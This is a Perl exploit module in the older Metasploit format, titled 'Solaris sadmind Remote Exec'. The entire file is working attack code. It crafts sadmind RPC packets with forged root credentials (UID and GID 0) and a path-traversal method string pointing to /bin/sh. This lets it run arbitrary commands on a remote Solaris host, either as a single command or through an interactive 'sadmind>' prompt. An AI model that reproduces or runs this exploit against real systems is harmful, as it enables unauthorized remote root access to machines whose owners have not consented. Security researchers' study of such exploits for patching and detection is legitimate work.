use IO::Socket;
use IO::Select;
use POSIX;
use Pex;

##
#
$Name = "Solaris sadmind Remote Exec";
$Version = "1.0";
$Author = "H D Moore";
$URL = "http://www.metasploit.com";
$Group = "Solaris";
$Description = 
"This exploit targets a weakness in the default security settings ".
"of the sadmind RPC application. This server is installed and ".
"enabled by default on most versions of the Solaris operating ".
"system.".
"Please see the following URL for more information on this vulnerability.\n\n".
"http://lists.insecure.org/lists/vulnwatch/2003/Jul-Sep/0115.html"; 

#
##

my $pex = Pex->new();
my $pay = {};

sub Init {
    my ($obj) = @_;
    $obj->NeedPayload(0);
}

sub Check {
    my ($obj, $opt) = @_;  
    return "No vulnerability check has been implemented for this module.";
}

sub Payloads 
{
    my ($obj, $opt) = @_;

    $pay->{"No Payload"} = 
    {
        METH    =>   '',
        NAME    =>   'none',
        PRIV    =>   0,
        NOTE    =>   'No payload needed',
        ARGS    => {   }
    };
    
    return $pay;
}

sub Options {
    my ($obj, $payload) = @_;
    my $res = {};
      
    $res->{"RHOST"} = [1, "The target system's ip address"];
    $res->{"RPORT"} = [0, "The port that sadmind is bound to"];
    $res->{"CMD"}   = [0, "The command line to execute"];
    
    return $res;
}


sub Exploit {
    my ($obj, $opt) = @_;

    select(STDOUT);$|++;

    my $portmap = 111;
    my $target_host = $opt->{"RHOST"};
    
    if (! $target_host)
    {
        print STDERR "[*] Error: RHOST must be specified\n";
        return;
    }
    
    my $target_port = $opt->{"RPORT"} || rpc_getport($target_host, $portmap, 100232, 10);
    my $command  = $opt->{"CMD"};

    if (! $target_port)
    {
        print STDERR "[*] Error: Could not determine port used by sadmind\n";
        return;
    }

    print STDERR "[*] Trying to obtain hostname of $target_host:$target_port\n";

    ##
    #  Determine the hostname of the target
    ##

    my $target_name = "METASPLOIT";
    my $s = rpc_socket($target_host, $target_port);
    if (! $s) { return }
    
    my $x = rpc_sadmin_exec($target_name, "id");
    print $s $x;
    my $r = rpc_read($s);
    close ($s);

    if ($r && $r =~ m/Security exception on host (.*)\.  USER/)
    {
        $target_name = $1;
    } else {
        print STDERR "[*] Error: could not obtain target hostname.\n";
        return;
    }


    print STDERR "[*] Preparing to execute command(s) on $target_name:$target_port\n";

    ##
    #  Execute commands :)
    ##

    my $interactive = 0;

    if (! $command) { $interactive++ }

    do {

        if ($interactive) { $command = command_prompt() } else 
        {
            print STDERR "[*] Executing command on '$target_name' via port $target_port\n";
        }

        if (! defined($command)) { return }

        $s = rpc_socket($target_host, $target_port);
        if (! $s) { return }
        
        $x = rpc_sadmin_exec($target_name, $command);
        print $s $x;
        $r = rpc_read($s);
        close ($s);

        if ($r) 
        {  
            # Command Failed
            if (length($r) == 36 && substr($r, 24, 4) eq "\x00\x00\x00\x29")
            {
                print STDERR "[*] Error: something went wrong with the RPC format.\n";
                return;
            }

            # Command might have failed
            if (length($r) == 36 && substr($r, 24, 4) eq "\x00\x00\x00\x2b")
            {
                print STDERR "[*] Error: something may have gone wrong with the sadmind format\n";
            }

            # Confirmed success
            if (length($r) == 36 && substr($r, 24, 12) eq ("\x00" x 12))
            {
                print STDERR "[*] Success: your command has been executed successfully.\n";
            }    

            if (length($r) != 36)  { print STDERR "Unknown Response: $r\n" }

        } else {
            print STDERR "[*] Error: no response recieved, you may want to try again.\n";
            return;
        }

    } while ($interactive);

    return;
}

sub command_prompt {
    select(STDIN);  $|=0;
    select(STDOUT); $|++;
    
    print STDOUT "\nsadmind> ";
    my $command = <STDIN>;
    chomp($command);
    if (! $command || lc($command) eq "quit" || lc($command) eq "exit")
    {
        print "\nExiting interactive mode...\n";
        return(undef);
    }
    return ($command)
}

sub rpc_socket {
    my ($target_host, $target_port) = @_;
    my $s = IO::Socket::INET->new
    (
        PeerAddr => $target_host, 
        PeerPort => $target_port,
        Proto    => "udp",
        Type     => SOCK_DGRAM
    );

    if (! $s)
    {
        print "\nError: could not create socket to target: $!\n";
        return(0);
    }

    select($s); $|++;
    select(STDOUT); $|++;
    nonblock($s);
    return($s);
}

sub rpc_read {
    my ($s) = @_;
    my $sel = IO::Select->new($s);
    my $res;
    my @fds = $sel->can_read(4);
    if (scalar(@fds)) { sysread($s, $res, 2048) }
    return($res);  
}

sub nonblock {
    my ($fd) = @_;
    
    $fd->blocking(0);
    $fd->autoflush(1);
    
    if ($^O ne "MSWin32")
    {
        my $flags = fcntl($fd, F_GETFL,0);
        fcntl($fd, F_SETFL, $flags|O_NONBLOCK);
    }
}

sub rpc_getport {
    my ($target_host, $target_port, $prog, $vers) = @_;
    
    my $s = rpc_socket($target_host, $target_port);

    my $portmap_req =
        
        pack("L", rand() * 0xffffffff) . # XID
        "\x00\x00\x00\x00".              # Call
        "\x00\x00\x00\x02".              # RPC Version
        "\x00\x01\x86\xa0".              # Program Number  (PORTMAP)
        "\x00\x00\x00\x02".              # Program Version (2)
        "\x00\x00\x00\x03".              # Procedure (getport)
        ("\x00" x 16).                   # Credentials and Verifier
        pack("N", $prog) .
        pack("N", $vers).
        pack("N", 0x11).                 # Protocol: UDP
        pack("N", 0x00);                 # Port: 0

    print $s $portmap_req;

    my $r = rpc_read($s);
    close ($s);
    
    if (length($r) == 28) 
    { 
        my $prog_port = unpack("N",substr($r, 24, 4));
        return($prog_port); 
    }
    
    return undef;
}


sub rpc_sadmin_exec {

    my ($hostname, $command) = @_;
    my $packed_host = $hostname . ("\x00" x (59 - length($hostname)));
    
    
    my $rpc =
        pack("L", rand() * 0xffffffff) . # XID
        "\x00\x00\x00\x00".              # Call
        "\x00\x00\x00\x02".              # RPC Version
        "\x00\x01\x87\x88".              # Program Number  (SADMIND)
        "\x00\x00\x00\x0a".              # Program Version (10)
        "\x00\x00\x00\x01".              # Procedure
        "\x00\x00\x00\x01";              # Credentials (UNIX)
                                         # Auth Length is filled in

    # pad it up to multiples of 4
    my $rpc_hostname = $hostname;
    while (length($rpc_hostname) % 4 != 0) { $rpc_hostname .= "\x00" }
    
    my $rpc_auth =
        # Time Stamp
        pack("N", time() + 20001) .

        # Machine Name
        pack("N", length($hostname)) . $rpc_hostname .

        "\x00\x00\x00\x00".              # UID = 0
        "\x00\x00\x00\x00".              # GID = 0
        "\x00\x00\x00\x00";              # No Extra Groups  


    $rpc .= pack("N", length($rpc_auth)) . $rpc_auth . ("\x00" x 8);

    my $header =
    
    # Another Time Stamp
    reverse(pack("L", time() + 20005)) .

    "\x00\x07\x45\xdf".
    
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04".
    
    "\x7f\x00\x00\x01".                 # 127.0.0.1
    "\x00\x01\x87\x88".                 # SADMIND
    
    "\x00\x00\x00\x0a\x00\x00\x00\x04".
    
    "\x7f\x00\x00\x01".                 # 127.0.0.1
    "\x00\x01\x87\x88".                 # SADMIND

    "\x00\x00\x00\x0a\x00\x00\x00\x11\x00\x00\x00\x1e".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00".

    "\x00\x00\x00\x3b". $packed_host.

    "\x00\x00\x00\x00\x06" . "system".
    
    "\x00\x00\x00\x00\x00\x15". "../../../../../bin/sh". "\x00\x00\x00";
    
    # Append Body Length ^-- Here

    my $body = 
    "\x00\x00\x00\x0e". "ADM_FW_VERSION".
    "\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00".
    "\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x08". "ADM_LANG".
    "\x00\x00\x00\x09\x00\x00\x00\x02\x00\x00".
    "\x00\x01". "C" . 
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x0d". "ADM_REQUESTID".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x12\x00\x00\x00\x11".
    "0810:1010101010:1"."\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00".

    "\x00\x00\x00\x09". "ADM_CLASS".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x07".
    "\x00\x00\x00\x06" . "system" .
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x0e" . "ADM_CLASS_VERS" .
    "\x00\x00\x00\x00\x00\x09\x00\x00\x00\x04".
    "\x00\x00\x00\x03". "2.1".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x0a" . "ADM_METHOD" . 
    "\x00\x00\x00\x00\x00\x09\x00\x00\x00\x16".
    "\x00\x00\x00\x15". "../../../../../bin/sh" . 
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x08". "ADM_HOST" .
    "\x00\x00\x00\x09\x00\x00\x00\x3c\x00\x00\x00\x3b".
    $packed_host.

    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x0f". "ADM_CLIENT_HOST".
    "\x00\x00\x00\x00\x09".
    
    pack("N", length($hostname) + 1) .
    pack("N", length($hostname)) .
    $rpc_hostname .
    "\x00\x00\x00\x00". "\x00\x00\x00\x00".
    
    "\x00\x00\x00\x11" . "ADM_CLIENT_DOMAIN".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x11" . "ADM_TIMEOUT_PARMS".
    "\x00\x00\x00\x00\x00".
    "\x00\x09\x00\x00\x00\x1c".
    "\x00\x00\x00\x1b" . "TTL=0 PTO=20 PCNT=2 PDLY=30".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x09" . "ADM_FENCE" .
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x01\x58\x00\x00\x00\x00\x00\x00\x09\x00".
    "\x00\x00\x03\x00\x00\x00\x02" . "-c" .
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x59\x00".
    "\x00\x00\x00\x00\x00\x09\x00\x00\x02\x01\x00\x00\x02\x00".

    $command . ("\x00" x (512 - length($command))).

    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10".
    "netmgt_endofargs";

    my $res = $rpc . $header . pack("N", (length($body) + 4 + length($header)) - 330) . $body;

    return($res);
}
